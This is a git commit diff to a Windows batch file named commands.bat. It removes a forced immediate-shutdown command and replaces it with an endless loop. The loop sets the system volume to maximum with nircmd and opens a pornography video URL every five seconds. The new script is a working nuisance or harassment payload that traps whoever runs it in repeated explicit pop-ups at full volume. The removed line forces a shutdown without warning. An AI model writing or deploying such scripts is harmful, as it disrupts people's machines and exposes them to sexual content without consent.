6c8ae144cb052b1a92daf9f7ac48995c2b16d374
mickr309 <mickrosenau309@gmail.com>
2025-03-06 20:17:27 +0100

    Update commands.bat

--- commands.bat
+++ commands.bat
@@ -1,1 +1,7 @@
-shutdown /s /f /t 0
+@echo off
+
+:loop
+nircmd.exe setsysvolume 65535
+start "" "https://www.pornhub.com/view_video.php?viewkey=67832a6086b7e#1"
+timeout /t 5 /nobreak > nul
+goto loop
